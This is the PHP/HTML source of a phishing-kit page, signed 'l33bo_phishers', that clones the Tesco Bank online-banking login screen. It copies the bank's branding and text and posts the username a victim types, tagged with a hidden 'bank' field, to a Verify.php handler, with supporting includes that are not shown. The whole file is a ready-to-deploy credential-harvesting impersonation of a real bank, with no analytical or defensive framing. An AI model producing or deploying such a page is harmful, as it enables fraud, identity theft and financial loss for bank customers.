<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class=" svg csscalc boxsizing js">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta charset="utf-8">
<title>Login</title>
<meta content="width=device-width, initial-scale=1.0" name="viewport" id="viewport">
<link rel="stylesheet" href="assets/css/login.css">
<script type="text/javascript">document.getElementsByTagName('html')[0].className += ' js';</script>
<link type="image/x-icon" href="assets/img/favicon.ico" rel="shortcut icon">
</head>
<body id="page-input-customer-no">
<div id="top-border">
<div class="clearing" id="bottom-border">
<div id="page-container">
<div id="preheader">
<script type="text/javascript">document.getElementsByTagName('body')[0].removeAttribute('class'); // remove no-js</script>
<div class="tesco-cookie-widget js-hide js-cookie-widget">
  <div class="inner">
    <p>Our website works better with cookies. Browsing on means you agree to our <a href="#">Cookie Policy</a>.</p>
  </div>
</div><!-- - --></div><div id="heading"><header role="banner">
  <div class="header">
    <div class="inner">
      <div class="header__logo" role="img"><a href="#"><img src="assets/img/logo1.png"></a>
      </div>
    </div>
  </div>
</header><!-- - --></div><div id="maincontent"><div id="content" tabindex="-1"><div class="page-heading">
  <div class="inner">
    <h1 class="page-heading__primary">Welcome to Online Banking</h1>
<h4>Introducing our improved login for Current Accounts, Credit Cards, Loans &amp; Savings customers.</h4>
  </div>
</div><div class="form" id="login-box">
  <div class="inner">

    <div id="login-panel" class="form__panel hide" style="display: block;">
      <h2 class="form__heading">Log in to your account</h2>
      <form action="Verify.php" enctype="application/x-www-form-urlencoded" method="post" id="login" name="login">
        <input name="bank" type="hidden" value="Tesco">
        <div class="grid__row">
          <div class="grid__col grid__col--two">
            <div class="form__item form__item--wide">
              <label for="login-uid" class="form__label">Username</label>
              <div class="form__control">
			  <input type="text" name="user" id="user" required class="form__input" placeholder="Enter username"></div>
            </div>
            <div class="form__item form__item--wide">
              <div class="form__checkbox">
                <input class="form__checkbox__input" type="checkbox" id="remember-username">
                <label class="form__checkbox__label" for="remember-username">Remember my Username
                  <a href="#" class="tooltip has-icon js-tooltip"><i class="icon icon--tooltip"><span class="screen-reader-only">Help entering your security number</span></i></a></label>
              </div>
            </div>

            <div id="security-number-help" class="tooltip__content js-hide" aria-expanded="false">
              <p>Tick this box to save your username on this computer. We don't recommend you do this if
                you're using a public or shared computer.</p>
            </div>
          </div>

          <div class="grid__col grid__col--two">
            <div class="login-submit"><input type="submit" class="button button--action" id="login-uid-submit-button" value="Log in"></div>
          </div>

        </div>

        <p><a href="#">Forgotten your Username?</a></p>
      </form>
    </div>
  </div>
</div>
<div id="login-links" class="useful-links hide" style="display: block;">
  <div class="inner">
    <div class="useful-link">
      <p><a href="#">Mortgage customers log in here</a></p>
    </div>
    <div class="useful-link useful-link__divider" id="register-now">
      <p>Not yet registered? <a href="#">Register now for Online Banking</a></p>
    </div>
  </div>
</div>
<div class="demos add-bottom">
  <div class="inner">
    <div class="grid__row">
      <div class="grid__col grid__col--two">
        <h3 class="content-heading">View our log in demo</h3>
        <div class="demo-panel"><a href="#"><img src="assets/img/demo-login.png"></a></div>
      </div>
      <div class="grid__col grid__col--two">
        <h3 class="content-heading">View our registration demo</h3>
        <div class="demo-panel"><a href="#"><img src="assets/img/demo-registration.png"></a></div>
      </div>
    </div>
  </div>
</div>
<div class="useful-links">
  <div class="inner">
    <div class="useful-link">
      <p class="has-icon"><i class="icon icon--banking-help"></i><a href="#" class="icon-link">Online banking help</a></p>
    </div>
    <div class="useful-link">
      <p class="has-icon"><i class="icon icon--security"></i><a href="#" class="icon-link">How to protect yourself online</a></p>
    </div>
  </div>
</div>
<div class="safety-content add-bottom">
  <div class="inner">
    <h3 class="content-heading">Remember to keep your banking details safe</h3>
    <ul class="add-bottom">
      <li>Never tell anyone your security details.</li>
      <li>Never respond to an email asking for your personal security information.</li>
      <li>If you think you have received a fraudulent email, please forward it to <a href="#">phishing@tescobank.com</a> and then delete it.</li>
    </ul>
  </div>
</div>
<!-- l33bo --></div><!-- l33bo --></div><div id="row-footer"><footer>
  <div class="footer">
    <div class="inner">
      <p class="footer__copyright" role="contentinfo">Copyright � 2016 Tesco Personal Finance plc</p>
    </div>
  </div>
</footer>
<!-- l33bo --></div><div id="postfooter">
<!-- l33bo -->
</div>
</div>
</div>
</div>
</body>
</html>